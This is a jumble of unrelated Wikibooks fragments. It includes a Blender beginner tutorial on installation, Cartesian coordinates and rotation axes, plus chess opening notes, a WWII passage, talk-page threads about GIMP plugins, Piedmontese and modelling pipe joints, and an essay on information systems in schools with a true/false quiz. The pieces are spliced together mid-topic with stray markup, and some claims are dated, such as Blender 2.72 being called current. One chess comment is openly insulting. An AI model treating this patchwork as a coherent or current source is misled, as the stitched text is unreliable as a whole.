* Linux (32-bit and 64-bit x86)
* Apple Mac OS X (PowerPC and Intel)
* FreeBSD (32-bit and 64 bit)
* Solaris
* Irix

For example, to install Blender on a Debian-based GNU/Linux distribution (such as Ubuntu), you can enter the following command into the terminal:

:*&lt;code&gt;sudo apt-get update &amp;&amp; sudo apt-get upgrade &amp;&amp; sudo apt-get install blender&lt;/code&gt;

Windows users get to choose between an executable installer (&quot;setup wizard&quot;) and a ZIP archive.

{{Hidden end}}

Once that finishes, Blender should appear in the Graphics section of your desktop environment's application menu.

You may also want to download 2D image editor, such as {{B3D:N2P/FirstUse|GIMP}} ([http://www.gimp.org/downloads]), Paint.NET ([http://www.getpaint.net/]), or Photoshop. For viewing video files, you may want to install {{B3D:N2P/FirstUse|VLC}} ([http://www.videolan.org/vlc/index.html]) media player.

It's also a good idea to have pencil and paper handy for sketching and taking notes. There's a lot to absorb. Taking notes as you go will pay dividends later.

=== Where to Go for Help ===

In case you get stuck, you can [[../Asking for Help|ask for help from other Blender users]] in the [[../#Appendices|appendices]].

== Additional Resources ==
Many modules have a section like this at the bottom, listing websites with information on the topics covered in the module.

== Coping with Designing Problems ==
Many problems with modeling in 3D come from poor practice early on in the creation of your project. These kinds of problems can be difficult to rectify later on without completely recreating the project. This chapter will help you deal with these problems before they occur. Navigate to the next page to start the chapter.&lt;br&gt;
'''This chapter deals with certain subjects or terms you may not have learned yet. While this chapter is useful knowledge, it may be difficult to comprehend certain subjects within the chapter. It will be more useful to simply take written notes and save them for later than try and absorb the knowledge. '''

== Fastest? ==

Is there any way to prove that there are no other checkmates faster than or as fast as this one? --[[User:Whoop whoop pull up|Whoop whoop pull up]] &lt;sup&gt;[[User talk:Whoop whoop pull up|Bitching Betty]] | [[Special:Contributions/Whoop whoop pull up|Averted crashes]]&lt;/sup&gt; 23:49, 11 April 2011 (UTC)

:f3 e6 g4 Qh4 is a differnt position, but it's the same idea and most black players would play e5 instead because it's better. Clearly there can't be a faster because none of the first moves are checks, you're compelled to block a check even if you have no other option, and white has several good options queenside and g3 kingside to do just that.

= English Opening =
===2. c4===
2. c4 is a very common move in the English Opening, competing for the d5 square. It is also very flexible, allowing white to transpose into Queen's Pawn openings with a later d4 move or various lines in the English Opening (1.c4).

This position is also often reached with the move order 1.c4 Nf6 2.Nf3.

      <text xml:space="preserve">During the fall and early winter of 1941, German armored divisions had advanced toward Moscow at a rapid pace, capturing hundreds of thousands of Soviet troops in the process. By late November, German armored divisions, within a day’s travel, threatened the city. But by the first week of December, snow began falling, and temperatures plunged to -40° C (-40° F). The German soldiers, not dressed for winter weather, were freezing and losing their will to fight. Their equipment also froze, becoming useless. The Russian winter finally accomplished what its military had failed to do: It halted the German offensive.

The German army had practically turned its invasion of Russia into a rout. But at the end of July 1942, Soviet Premier Joseph Stalin issued the order, “Not a step back!” The Germans assaulted the city of Stalingrad that month, a crucial city of the Soviet Union. In the ruins of Stalingrad, shown here, Soviet soldiers fought the Germans building-by-building in a savage battle for the city that lasted for five months.

===3. g3===

White plans to develop his bishop into the long diagonal. By doing this the bishop will exert some serious pressure into the central light squares (especially d5) and into the enemy queenside. This does not come without issues however, as a king castled behind a fianchettoed bishop becomes very vulnerable should the bishop be removed.
Black now has two acceptable options, one is to play d5 immediately as delaying this move will allow white to achieve overprotection of this important central square by 4.Bg2.
Another choice for black, perhaps the sharpest is to play 3...c6, the knight will be blocked from its best square but black regains control over the d5 square and closes the long diagonal for a bishop on g2. Once d5 has been played by black, his mighty center may cause some problems for white, although (as always) the more developed player can undermine it in hypermodern fashion through the use of his c- pawn, knights and fianchettoed bishop.

After giving the pawn on d5, the e4 square is now free so Black pushes the e pawn instead of taking on f4.  The idea is to ruin White's plan of opening the f file.  The e4 pawn will also be quite a nuisance for White as it prevents natural development of the knight on f3.  White will thus try to get rid of this pawn as soon as possible.

      <text xml:space="preserve">== The CMYK color model plugin ==
If there is a plugin - which I could need right know - why isn´t it postet in here as a link?

I found this on the net:
[http://cue.yellowmagic.info/softwares/separate.html CMYK color model plugin]
But I´m not shure if it works.

::Hmm... I don't know, maybe that's because this page is ''not'' a list of plugins, but howto on installing plugins. [[User:Soeb|Soeb]]&amp;nbsp;&lt;sup&gt;[[User_talk:Soeb|talk]]&amp;#124;[[Special:Contributions/Soeb|contribs]]&lt;/sup&gt; 13:48, 23 March 2009 (UTC)


===GNU/Linux===



RTFM really should be the first piece of advice!  One would think?  [[User:Newbiegimplinux|Newbiegimplinux]] ([[User talk:Newbiegimplinux|talk]]) 06:23, 29 December 2010 (UTC)


      On GNU/Linux, you might need to read the manual at the official site first under the section:

     &quot;1.3. Installing New Plugins&quot;  http://docs.gimp.org/en/gimp-scripting.html#gimp-plugins-install

=== In order to test the plugin ===
You simply test the plugin! Durrr![[Special:Contributions/88.159.66.226|88.159.66.226]] ([[User talk:88.159.66.226|discuss]]) 20:56, 17 October 2012 (UTC)</text>

__TOC__


If you haven't previously studied 3D graphics, technical drawing, or analytic geometry, you are about to learn a new way of visualizing the world, an ability that's fundamental to working with Blender or any 3D modeling tool.

3D modeling is based on {{B3D:N2P/FirstUse|geometry}}, the branch of mathematics concerned with spatial relationships, specifically {{B3D:N2P/FirstUse|analytical geometry}}, which expresses these relationships in terms of algebraic formulas.  You may have studied geometry in school, in which case, some of the terminology will seem familiar.

== Coordinates And Coordinate Systems ==

Look around the room you’re in. The odds are it will have a cuboidal shape, with four vertical walls at right angles to each other, a flat, horizontal floor, and a flat, horizontal ceiling.

Now imagine there’s a fly buzzing around the room. (If there really is a fly buzzing around, feel free to look at it instead of imagining.) The fly is moving in three-dimensional space. In mathematical terms, what that means is that, at any moment, its position within the room can be expressed in terms of a unique combination of three numbers.

Now, there are an infinite number of ways—''coordinate systems''—in which we could come up with a convention for defining and measuring these numbers—the ''coordinates''. And each convention will give different values for the numbers, even if the fly is in the same position—coordinates only make sense with reference to a specific coordinate system! To narrow down the possibilities (in a purely arbitrary fashion, of course), let us label the walls of the room with the points of the compass: in a clockwise direction, North, East, South and West. (If you know which way is really north, feel free to use that to label the walls of your room; otherwise, choose any wall you like as north.)

Consider the south-west corner of your room, the point at floor level. We will call this (arbitrary) point the ''origin'' of our coordinate system, and the three numbers at this point will be &lt;math&gt;(0, 0, 0)&lt;/math&gt;. The first of the three numbers will be the distance (in some suitable units, let’s say metres) eastwards from the west wall, the second number will be the distance northwards from the south wall, and the third number will be the height above the floor.

Each of these directions is called an ''axis'' (plural: ''axes''), and they are conventionally labelled X, Y and Z, in that order. With a little bit of thought, you should be able to convince yourself that every point within the space of your room corresponds to exactly one set of &lt;math&gt;(x, y, z)&lt;/math&gt; values. And conversely that every possible combination of &lt;math&gt;(x, y, z)&lt;/math&gt; values, with &lt;math&gt; 0 \le x \le W &lt;/math&gt;, &lt;math&gt;0 \le y \le L&lt;/math&gt; and &lt;math&gt;0 \le z \le H&lt;/math&gt; (where &lt;math&gt;W&lt;/math&gt; is the east-west dimension of your room, &lt;math&gt;L&lt;/math&gt; is its north-south dimension, and &lt;math&gt;H&lt;/math&gt; is the height between ceiling and floor) corresponds to a point in the room.

The following diagram illustrates how the coordinates are built up, using the same colour codes that Blender uses to label its axes: red for X, green for Y and blue for Z (an easy way to remember this if you're familiar with RGB is the order -- Red X, Green Y, Blue Z). In the second picture, the value for ''x'' defines a plane parallel to the west wall of the room; in the third picture, the value for ''y'' defines a plane parallel to the south wall; and in the fourth picture, the value for ''z'' defines a plane parallel to the floor. Put the planes together in the fifth picture, and they intersect at a unique point.

[[File:BlenderCoordinates.png|800px|center]]

This style of coordinate system, with the numbers corresponding to distances along perpendicular axes, is called ''Cartesian coordinates'', named after René Descartes, the 17th-century mathematician who first introduced the concept. Legend has it that he came up with the idea after watching a fly buzzing around his bedroom!

There are other ways to define coordinate systems, for example by substituting direction angles in place of one or two of the distance measurements. These can be useful in certain situations, but usually all coordinate systems in Blender are Cartesian. However, switching between these coordinate systems is simple and easy to do in Blender.

=== Negative Coordinates ===

Can coordinate values be negative? Depending on the situation, yes. Here we are only considering points within our room. But supposing, instead of placing our origin in the bottom southwest corner, we put it in the middle of the room, halfway between the floor and ceiling. (After all, it is an arbitrary point, we can place it wherever we would like to, just as long as we all agree on where it is.) Now, remember that our X-coordinate is the distance ''east'' from the origin; How do we express the fact that a point lies ''west'' of the origin? Simple: We give it a negative X-coordinate. Similarly, points north of the origin have a positive Y-coordinate, while those south of it get a negative Y-coordinate; and those points above the origin get a positive Z-coordinate, while those below it get a negative Z-coordinate.

=== Handedness Of Coordinate Systems ===

It is conventional for most Cartesian coordinate systems to be ''right-handed''. To see what this means, hold the thumb, index finger and middle finger of your right hand perpendicular to each other:
[[Image:Rechte-hand-regel.jpg|thumb|right|200px|'''Figure 1:''' The three axes form a right-handed system]]
Now you can orient your hand so that the thumb points along the X-axis in the positive direction (direction of increasing coordinate numbers), the index finger along the positive Y-axis, and the middle finger along the positive Z-axis. Another way of looking at it is, if you placed your eye at the origin, and you could see the three arrows pointing in the directions of positive X, positive Y and positive Z as in Figure 1, the order X, Y, Z would go clockwise.

== Axes Of Rotation ==

Consider a spinning ball. Every point on it is moving, except the ones right in the middle: these form a line of stillness around which the rest of the ball spins. This line is called the ''axis of rotation''.

More precisely, the axis of rotation of a rotating object over a period of time is a point or a line connecting points that do not change position while that object rotates, drawn when the observer assumes he/she does not change position relative to that object over time.

Conventionally, the ''direction'' of the axis of rotation is such that, if you place your eye looking in that direction, the rotation appears clockwise, as illustrated below, where the yellow arrow shows the rotational movement, while the purple one shows the rotation axis:

[[File:RotationAxisDirections.png]]

To remember this convention, hold your right hand in a thumbs-up gesture:
[[Image:Blender3D DirectionOfRotation.png]]
If the rotation follows the direction of the curled-up fingers, then the direction of the axis of rotation is considered to be the same as the direction which the thumb is pointing in.

This gesture is a different form of the right-hand rule and is sometimes called ''[[w:Right-hand rule#Direction associated with a rotation|the right-hand grip rule]]'', ''the corkscrew-rule'' or ''the right-hand thumb rule''. From now on in this book, it will be referred to as 'the right-hand grip rule'.

When describing the direction of a rotating object, do not say that it rotates ''left-to-right/clockwise'', or ''right-to-left/counterclockwise''. Each of these claims on their own are useless, because they're relative to the observer. Instead of saying this, find the direction of the axis of rotation and draw an arrow to represent it. Then people who know the right-hand grip rule will be able to figure out what the direction of rotation of the object is, by using the rule when interpreting your drawing.

Blender's '''user interface''' (the means by which you control the software) is not particularly easy to learn.  However, it has improved over time and is expected to continue doing so. The current version of the Blender software is 2.72. You can [http://www.blender.org/download download it] from the [http://www.blender.org/ Blender Foundation]'s website.

The tutorials in this section will familiarize you with the basics of the user interface.  By the end of this section, you should be able to:
* resize, split, and merge any Blender window;
* change the type of any Blender window;
* access user preferences;
* access panels containing buttons and other controls;
* change the viewpoint of a viewport.

For those new to Blender, this is a fundamental section of the book.

===Advice on Customization===

Blender is a complex software package with many customizable features.  You can customize the user interface to assign new functions to buttons and hotkeys.  In fact, you can change almost anything to suit yourself.  However, this complicates the giving and following of directions. It is recommended that you adhere to the default screen arrangements of Blender in order to be able to follow well in the remaining parts of these tutorials. Blender ships along with some 4 to 5 screen-content arrangements which are suitable for almost any kind of job you'll want to use it for - from creating motions and animations to doing games.

We recommend leaving Blender's user interface in its &quot;factory settings&quot; while working through the ''Noob to Pro'' tutorials.  At the very least, wait until you've mastered the basics before you customize the interface - and we know you definitely will when you master it!

      <text xml:space="preserve">this article makes the major linguistic blunder of confusing &quot;dialects of Italy&quot; with &quot;dialects of Italian&quot;, . Pedemontese is most emphatically NOT a dialect of Italian, but a '''language of Italy''' (recognised as such by UNESCO). If one must refer to it as a dialect, it needs to be made clear, at least, that it is not a dialect of Italian. In fact, I would say that a talk about dialects of Italy has no place in an article about Italian, as they are very distinct linguistic entities, especially those dialecs/langauges spoken above the Rimini-La Spezia line, as is Pedemontese. --[[User:Dakrismeno|Dakrismeno]] ([[User talk:Dakrismeno|talk]]) 13:24, 16 March 2009 (UTC)

:Even if one were to stipulate that the linguistic distinction is as absolute as you assert, its consequences for the article are not &amp;mdash; because that passage is in the section on history, where it's perfectly reasonable to mention languages other than Italian.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 17:58, 16 March 2009 (UTC)
::there is no need for stipulations. The vast majority of the relevant literature (e.g. Lepschy et al. 1996; Marcato 2002, Pellegrini 1975, Rohlfs 1937, ''among others'') separates the Italic branch from the Gallo-Romance (and thus Gallo-Italic) one (to which Pedemontese belongs). So, although it is perfectly reasonable to mention other languages, it is certainly incorrect (or at least irreconcilable with the whole of the literature on Romance linguistics) to claim that &quot;Piedemontese is a dialect of italian&quot;. --[[User:Dakrismeno|Dakrismeno]] ([[User talk:Dakrismeno|talk]]) 13:16, 17 March 2009 (UTC)</text>

      <text xml:space="preserve">== Number of vertices for a cylinder ==
In figure 1 the top left cylinder has 16 vertices at it's top and 16 vertices at it's bottom. The number of vertices is what you fill in in the dialog &quot;Add Cylinder&quot;. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 17:10, 16 March 2009 (UTC)

:I've updated the photos, it should be crystal clear now [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 22:58, 11 August 2010 (UTC)


Math question: Why does scaling by a factor of 1.4142 work in this case? I understand how it works for the T-Joint, but can someone explain the math for this example?

The math for this is fairly simple. When given a triangle with two 45 degree angles (called a 45-45-90 triangle), using the Pythagorean Theorem you can determine that if the two sides on the 90 degree angle are given the length of one, the hypotenuse (other side) has a length of square root of 2. Here's a picture that may help: http://commons.wikimedia.org/wiki/File:45-45-triangle.svg

== Scaling along axes (T joint) ==

I removed some notes:
* Scale with constraint Y axis (S-&gt;Shift-Y), about 1.4124 (square root of 2)
** ''(Blender Noob: In 2.47 this should be Y instead of shift+Y, I think this is the same in all recent versions and the tutorial is wrong.)''
: The tutorial is right (of course ;-)). Shift-Y scales at the X and Z axes while keeping the Y axis. This is what we need here. 
* To flatten the front: scale at the X axis by factor 0. (S-X, 0).
** ''(Blender Noob again: Using the factory default for 2.47 this should be Y.)''
Following the tutorial it works exactly as described. The vertices are extruded along the X axis. I have added a bit about the view. It may be misleading that figure 1 shows the model rotated 90° clockwise. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 14:49, 20 March 2009 (UTC)
: I've rotated figure 1 so that is meets the 3D view. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 15:03, 20 March 2009 (UTC)
:The (S-&gt;Shift-Y) is Wrong:
It means scale the vertices in two dimension : X&amp;Z.  but it doesn't really scale it in Z.
i think (S-&gt;YKEY) is true.[[User:Worm 19|Worm 19]] ([[User talk:Worm 19|talk]]) 13:04, 1 August 2010 (UTC)

I wondered about this myself, I will make the nesscary changes in the description of axis's being moved [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 01:34, 11 August 2010 (UTC)

== Using shear ==
Wouldn't a shear (^S 1) be simpler than this scale/rotation combination. The only drawback I can see is that it is view-dependent. [[Special:Contributions/63.224.110.152|63.224.110.152]] ([[User talk:63.224.110.152|talk]]) 23:17, 28 June 2009 (UTC)
: I agree. Though I can also ad to your comment that pressing the middle mouse button will let you cycle through the different option of where you would want to shear of, making the use of the pythagoram theory unnecesary. May this method be added as an &quot;alternative method&quot;? [[User:Mswf|Mswf]] ([[User talk:Mswf|talk]]) 17:18, 9 April 2010 (UTC)

== 6 cylinder joint - easier but not equivalent ==
[[User:Vaakmeisster|Vaakmeisster]] has suggested following method:
A faster way to make a 6 pipe junction is:
* Add a cube.
* Go to edit mode.
* Select all six faces of the cube with key '''A''' if they are not selected already.
* Extrude individual faces by 2 grid units ( Press '''E''' in your keyboard -&gt; ''Individual Faces'' then type '''2''' with your keyboard).
* Now select the outer faces of the block and delete to create the holes. You should delete 6 faces in total.
* Now select everything, click set smooth and subsurf and you'll get a 6-pipe junction. You also could crease some edges to clean up the mesh ( do this by selecting the edge and pressing '''shift E'''). 
This method is simpler, but doesn't lead to the same result, the insertion will be thicker than the pipes.

==Another Way==
This seemed quite complicated, so all i did was to delete the right faces from the default cube, extrude the edges, subsurf and then crease the joints. The result was almost the same.

==Flattening the tee==
User Comment: To flatten the front I had to relocate the 3D-Cursor to the vertices where the V-cut comes together, then select only the top half of the vertices and scale in the Y-axis by factor of zero.  Then select the bottom vertices and do the same.  Everything else in the tutorial worked perfectly.

:You need to set the centerpoint thingy back to median, in order for it to work the way it was written, i've bolded it [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 01:32, 11 August 2010 (UTC)

== Normals ==

A thought has just occurred to me... Part of the Jeep Body tutorial detailed how the wrong normals would make part of the model invisible, since the render would ignore the 'inner' surface. My question is... how can we see a render of the inside of the pipes when the normals are shown only on the outside?

[[User:Kevintropman|Kevintropman]] ([[User talk:Kevintropman|talk]]) 15:31, 10 November 2010 (UTC)

== Question about T joint ==

I this section there is one part saying:
&quot;There will be 6 vertex overlapped: 3 vertex linked to the top of the tube, 3 vertex linked to the bottom of the tube Select 3 of this vertex Depending on which half the vertexs are now selected you will need to rotate by -45 or +45.&quot;

Actually there a 14 vertex overlaped, 7 on each side. Also after pressing V there are 7 vertex selected.

The almost last step is to change Pivot to Median Point, but Median Point and 3D Curser are the same? Why should one do that?[[User:Adam.Elenktik|Adam.Elenktik]] ([[User talk:Adam.Elenktik|discuss]] • [[Special:Contributions/Adam.Elenktik|contribs]]) 16:10, 2 June 2013 (UTC)</text>

      <text xml:space="preserve">In its broadest sense, '''anatomy''' is the study of the structure of something, in this case a human.  Human anatomy deals with the way the parts of humans, from molecules to bones, interact to form a functional whole.  The study of anatomy is distinct from the study of physiology, although the two are often paired.  While anatomy deals with the structure of an organism, physiology deals with the way the parts function together.  For example, an anatomist may study the types of cells in the cardiac conduction system and how those cells are connected, while a physiologist would look at why and how the heart beats.  Thus, anatomy and physiology are separate, but complimentary, studies of how an organism works.

== Proposal to expand upon the 3. c3 &quot;enhanced&quot; Alapin line ==

What should black play after 3. c3? The only line that even approaches equality (by winning percentage) is e6. In every other line it seems white has a much easier time of it, with win percentages approaching double that of black. I referred to this as an &quot;enhanced&quot; Alapin as white gets an extra developed Knight due to black's essentially wasted h6.</text>

According to the U.S. Department of Commerce, the Internet is becoming an increasingly vital tool in our information society. More and more Americans are using the Internet to perform daily activities such as education, business transactions, personal communication, research, job searches and much more.  Information technology is increasingly important for educational advancement and community participation&lt;ref&gt;(U.S. Department of Commerce, Moreover this importance is growing in areas such as Economics and Statistics Administration, &amp; National Telecommunications and Information Administration. (2000, p. xv) &lt;/ref&gt;
  

In a sense, Information Systems (IS) has become the backbone of modern education. IS allows schools to store valuable student information and helps administration manage the school and the district as a whole.  If the use of IS benefits one division of education, then it will benefit the entire educational system.  When an IS tool benefits learning, then it benefits teaching.  If an IS tool benefits teaching, it in turn benefits administration and the learning students and so on.  It is a collaborative effort which affects all aspects of education.  
  

'''&lt;big&gt;ACCOMPLISHING LEARNING WITH INFORMATION SYSTEMS&lt;/big&gt;''' 
  

There have been published studies by many researchers showing strong evidence that technology aids in increasing academic achievement.  Organizations like Edutopia, the North Central Educational Lab (NCREL) and the Center for Applied Research in Educational Technology (CARET) are studying and tracking the tie that shows that technology is increasing academic achievement.  Students do not learn the same way as students did from the 20th century.  Technology has taken over their lives and using it in the classroom can create enthusiasm, better learning outcomes, and sustain interest in all subject areas in academics. 
  

Information systems are used in schools to enhance learning through very dynamic educational software developments ranging from games to virtual field trips.  According to studies, educational software designers have developed games that improve student motivation, promote constructivist and collaborative learning, and improve academic learning.&lt;ref&gt;Computers &amp; Education, v52 n1 p68-77 Jan 2009 &lt;/ref&gt; A sophisticated development involving the science of ecology and underwater marine life using computer animation and virtual technology was investigated.  A qualitative study was also conducted during the case study showing that virtual museums could raise students' interest and learning motivation.&lt;ref&gt;(Journal of Educational Technology Systems, v37 n1 p39-59 2008-2009&lt;/ref&gt; 
  

[http://en.wikipedia.org/wiki/E-learning E-learning] , Web TC, online classes and distance learning are classified as forms of [http://en.wikipedia.org/wiki/Instructional_technology instructional technology ]. Studies provide more favorable results for distance learning courses as effective tools for tracking student performance and withdrawal rate while end-of-semester completion  is barely acceptable.&lt;ref&gt;Journal of College Student Retention: Research, Theory &amp; Practice, v10 n1 p21-37 2008-2009&lt;/ref&gt;   There are numerous distance learning benefits, some of which include:

*Allowing students to attend classes when situations do not permit them to attend the on-campus classroom.
*Online courses give students flexibility to work on assignments when their schedule permits them to at any hour of the day.  This release a student from attending a class where a set day and time is scheduled.
*Ability to do interactive teamwork between groups. Students have the opportunity to correspond with others from different backgrounds and to hear from a variety of speakers from around the world. 
    

The possibility of learning with Information Systems is endless.  Students are able to use the Internet for research with an endless amount of information.  Multimedia presentations can be created in all subject areas.  Students of all ages can use online activities that pertain to their subject matter.  Keyboarding skills can be developed at very early ages, even before pre-kinder.  
To live and learn in an information-rich society, students must be able to use technology effectively in an educational setting and beyond.  
  

'''&lt;big&gt;ACCOMPLISHING TEACHING WITH INFORMATION SYSTEMS &lt;/big&gt;'''
  

Today’s teachers are facing many changes and it is becoming a more difficult job because of the numerous amounts of expectations. The use of technology in teaching can actually help with many of the expectations faced by teacher. Because IS changes year to year, it is important for teacher to take part in professional development in technology. Professional development will ensure that technology will be used effectively to create new opportunities for learning and to promote student achievement.
  

Having IS capabilities in the classroom allows students to have reference materials at their fingertips.  The web is a source not only for communication but can also provide reference for an enormous number of topics.  Today's web not only consists of Web sites where information on various topics can be found but it contains videos where the visual learner can study topics in a way that they process information.  One example is [http://school.discoveryeducation.com/ Discovery Education] where just about any topic can be found and used in the classroom. This resource provides educators with engaging digital resources to be more effective in the classroom and in turn increase student interest by connecting the classroom to an abundant amount of information from around the world. When using such resources, the teacher is now a facilitator in learning the subject material and not someone who is lecturing the materials like in the past.   
  

There are so many IS tools that teachers can present to students to aid in the learning process.   Another example is the use of the [http://cmap.ihmc.us/Publications/ResearchPapers/TheoryCmaps/TheoryUnderlyingConceptMaps.htm concept maps].  According to the Florida Institute for Human and Machine Cognition, concept maps are graphical tools to aid in organizing and representing knowledge. &lt;ref&gt;Joseph D. Novak &amp; Alberto J. Canas, Florida Institute for Human and Machine Cognition, Pensacola Fl 
http://cmap.ihmc.us/Publications/ResearchPapers/TheoryCmaps/TheoryUnderlyingConceptMaps.htm &lt;/ref&gt; This type of software allows students to work individually or in groups to create concept maps.  Students retain information using various learning styles.  


Much of the decision-making within schools is made from analyzing the data collected using IS technology.  An example of this IS technology would be an online test repository such as [http://www.fscreations.com/ Exam View] or [http://quizstar.4teachers.org/ Quiz Star] where students can take tests using the web and the results are graded instantly.  These online tools store the test and answers but will also keep students answers.  Reports can be generated immediately after the class has completed the test.  The data from the reports will be immediately available for teachers so they can analyze where students are struggling.

'''&lt;big&gt;ACCOMPLISHING MANAGEMENT WITH INFORMATION SYSTEMS &lt;/big&gt;'''
  

A [http://en.wikipedia.org/wiki/Database Database]  is a collection of programs that store and retrieve large amounts of information. Every school district and school building needs a way to track data that is collected for their district, state, and federal governance.  Schools can effectively maintain records of students' data, to include grades, schedules, absences, demographics, test scores, behavior, and medical records.  
 
An example of this type of system is SIS,  [http://www.sisk12.com/ School Information System].  Schools need a way to collect data and be able to print out reports using this data for evaluation purposes.  The software needed for the school/student management purpose needs to be efficient and at the fingertips of administration.  At anytime the parent, school board, or government can request information that is provided by the schools management system.  A management system can hold test scores which allow schools and teachers to see trends that are occurring.  Possibly new techniques are used to improve learning which caused test scores to improve.  A management system can show the rise in test scores to validate the effectiveness of the techniques used for students learning. 
 
Another aspect that IS plays a large roll in as a management tool is where students are scheduled for classes.  A school of 400 high school students could be a nightmare if it had to be done by hand.  The use of computer software can store students' preference or abilities in a database.  When schedule is done for the next school year, the database can be used to place students in the appropriate classes.  
  
The software application Administrator's Plus, developed by [http://www.rediker.com/accounting_software.html Rediker Software], collects the budget data that a school sets up and tracks the spending of the moneys.  At anytime a Year-to-date expenditures versus budget report can be produced.  This helps with over spending and improves accurate allocations of monies to various departments.

IS can be used for students to collaborate with each other and with the teacher.  For example, teachers can introduce a new software product they want students to use.  Students who have used the product before can help other students with less experience to master the use of the software.  Many times students work on individual created projects.  In the real world of work, people have to rely on each other to produce a quality product.  If students learn to work together, they will be successful when they enter the employment world.    
 

Collaboration between teachers can occur if lessons are stored in a centralized location in a database or on a server.  This way teachers can borrow lessons that will improve student's performance on a particular topic.  [http://profilerpro.com/ ProfilerPRO] allows for the evaluation of knowledge, attitude, and skill based on simple surveys implemented via the World Wide Web. Group members can share knowledge and promote collaboration based on responses to skills-based survey items. The use of this type of IS can strengthen education by allowing the ability to share expertise.  
  

In the past parents did not see students' grades until progress time or a report card was sent home.  The use if IS has changed this process.  Many schools now have the capability to allow parents to view their child's grades online.  As mentioned before, using [http://www.sisk12.com/ School Information System (SIS)] allows parents to see their child's grades, assignments and tests. This collaboration between teachers and the parents help in working together to help the student succeed.   Now, the parents will have no surprises when it comes to report card day. 
  
IS in schools can help teachers and student learn about other cultures and societies.  By using the web, students can chat and view live-web cams of other students in class around the world.  Additionally teachers can converse with teachers in other societies to share activities, projects and collaborative lesson plans.  The web can also host webniars, where students from all over the world can be in the class learning together.  Also, blogs can be used to post information on educational topics to be shared by all.  
  

'''&lt;big&gt;COMMUNICATION WITH INFORMATION SYSTEMS &lt;/big&gt;'''
  

Outlook Email, a Microsoft [http://en.wikipedia.org/wiki/E-mail email] application, is great communication software to use when connecting with your friends and family. According to the [http://email.about.com/cs/winclientreviews/gr/outlook.htm About.com] website, there are many pros and cons when it comes to using Outlook Email. Some pros indicated were:  &quot; Snappy, flexible search, virtual folders and mail grouping help you organize mail, Outlook integrates email messages, to-do lists and scheduling&quot;.  Some of the cons that were pointed out included &quot;Outlook is a bit confusing to set up and can be confusing to use with its myriad of options, and Outlook lacks useful message templates, and its RSS feed reader flexibility.”  
&lt;ref&gt;: About.com:Email, http://email.about.com/cs/winclientreviews/gr/outlook.htm &lt;/ref&gt;  
 

A lot of businesses use Microsoft Outlook as it's great at managing multiple accounts. Another great aspect of this application is that it has a built in encryption control, it will let you view attached files while inside the message and it leads you edit messages in Microsoft Word and even send an email from Microsoft Word.  
   

Many schools already incorporate a type of IS that patent's can have access to their child's grades and absences.   Basically, parents sign up for their own user name and password and they can log on to have access to this type of information.   Through this IS tool, schools can communicate with parents to inform them of their child's progress in each class 24/7. 
    

Communication can be done via the Web.  Students can access the web by connecting to the internet using Dial-up access, wireless networks, DSL [http://en.wikipedia.org/wiki/Digital_subscriber_line (Digital Subscriber Line)], satellite modem and cable modems. Schools today have Web sites where they have a link to school calendars, upcoming sporting events, contact information for the school and teachers, library resources and much more.  Without IS this all would not be possible.  By using this method of communication, schools relay information to parents and students in a timely manner.  
     
 
'''&lt;big&gt;ASSESSMENT &lt;/big&gt;'''

 'Indicate Whether Statement is True or False  /  Fill In The Blanks (T) or (F)  '
&lt;ol&gt;
&lt;li&gt;______ More and more Americans are using the internet to perform daily activities such as education, business transactions, personal communication, research, job searches, and much more.   
&lt;li&gt;______ IS tools are beneficial to learning in a variety of capacities, an IS tool that benefits teaching, may not benefit the administration.     
&lt;li&gt;______ Concept maps are graphical tools that can be used for organizing and representing knowledge.   
&lt;li&gt;______ IS tools are used for collecting and analyzing data within schools while decisions are made by the administration.     
&lt;li&gt;______ Web cams are sites where schools have a link to information such as its mission statement, calendar, event, contact information, mascots, and school colors.   
&lt;li&gt;______ Discovery Education is a web site that provide engaging digital resources for classroom teachers that in turn increase student interest by connecting the classroom to an abundant amount of information around the world     
&lt;li&gt;______ Technology is the responsibility of the I.S. department.    
&lt;li&gt;______ School Web sites allow parents to see their child's grades, assignments and tests.

== Bird's Opening/Fool's Mate ==
==2...Qh4#==
White has played a very poor move and allowed Black the quickest possible checkmate in the opening game of chess. Mate in two moves.
The mate almost never occurs in practice but is commonly known among chess players because it is the fastest possible.

=Grob's Attack=
===1. g4 e5===
This move is interesting not because it is a commonly-played move, nor because it gives an advantage to either player, but because white has not one but two moves that lead to an early black checkmate. [[/2. f4|2. f4??]] transposes to the Bird Opening's From Gambit, but this matters little because black can easily mate. [[/2. f3|2. f3??]] leads to the same early demise for white, this time transposing to the Barnes opening. Both these blunders are called Fool's Mate, and tie for the fastest possible checkmate for black.

Although Grob's Attack is itself rarely used among serious players, [[/2. d3|2. d3]] is a more serious alternative.

What an idiot wrote this? Did this idiot ever played Grob? Did he know that this move has near 40% of wins (2.Bg2 almost 50% of wins)? All this topic is about Fool's mate! Strange, but I didn't saw such stupidity in f3 and f4 topic. Here is no theory about g4/e5, just thinkings of four years old kid...</text>

Please take extra care not to upload new images over existing ones that are used in different books.

== Language wikibooks ==

I noticed your recent edits on the [[Chinese]] wikibooks. Unfortunately, it doesn't seem to have many active contributors. Writing language textbooks is a long and difficult process, not all contributors have the patience and some bite off a bit more than they can chew. That was the case with the [[Japanese]] wikibook when I started contributing to it nearly a year ago. Thanks for your contributions so far.

If you and your teacher would like to work on this wikibook to use it in your classes, that could be of great help. Some books here at Wikibooks are also written largely or in part by students in a course, under the oversight of a teacher.

Please let me know if you have any questions or comments. Note also the various [[Wikibooks:Reading room]]s where you can get a wider audience for your comments or requests for assistance. Good luck with your studies, welcome to Wikibooks and happy editing! --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 06:29, 17 March 2009 (UTC)


:Thanks, Swift.  We probably won't use this for our class, because we are already well into the papyrus version of a book.  And since I'm not fluent, my own contributions will probably be limited.  But I'll improve what I can when I get around to it.  :-)  --[[User:Yakowenko|Yakowenko]] ([[User talk:Yakowenko|talk]]) 21:55, 25 March 2009 (UTC)</text>

